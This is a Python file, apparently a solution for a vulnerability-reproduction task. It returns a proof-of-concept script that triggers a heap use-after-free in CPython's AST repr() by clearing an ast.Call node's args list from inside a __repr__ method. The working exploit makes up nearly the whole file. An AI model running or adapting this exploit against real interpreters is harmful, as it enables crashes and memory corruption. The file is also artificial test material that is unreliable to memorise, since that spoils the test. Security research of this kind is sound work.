import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in AST repr().
        The vulnerability is caused by mutating the AST structure (specifically a list field)
        during the execution of repr(), which iterates over that list.
        """
        # We construct a Python script that:
        # 1. Defines a class with a malicious __repr__ method.
        # 2. Creates an AST node (ast.Call) which contains a list of arguments.
        # 3. Inserts an instance of the malicious class into the list.
        # 4. Calls repr() on the AST node.
        # 5. When repr() iterates the list and calls __repr__ on our object,
        #    we clear the list in the AST node. This drops the reference to the list.
        #    If the C-level loop holds a borrowed reference to the list (common optimization),
        #    the list is freed, and subsequent access in the loop triggers UAF.
        
        poc_content = r"""import ast
import sys

class UAFTrigger:
    def __repr__(self):
        global node
        # Mutate the AST node to drop the reference to the list being iterated.
        # This causes the list object to be freed while the C loop is iterating it.
        node.args = []
        return "UAF"

# Create a Call node. The 'args' field is a list that will be iterated by repr().
# We place UAFTrigger() first. The iteration will execute UAFTrigger.__repr__.
# We place a second element (1) to ensure the loop continues and accesses freed memory/pointers.
node = ast.Call(func=ast.Name(id='f', ctx=ast.Load()), args=[UAFTrigger(), 1], keywords=[])

# Trigger the vulnerability
try:
    repr(node)
except Exception:
    pass
"""
        return poc_content.encode('utf-8')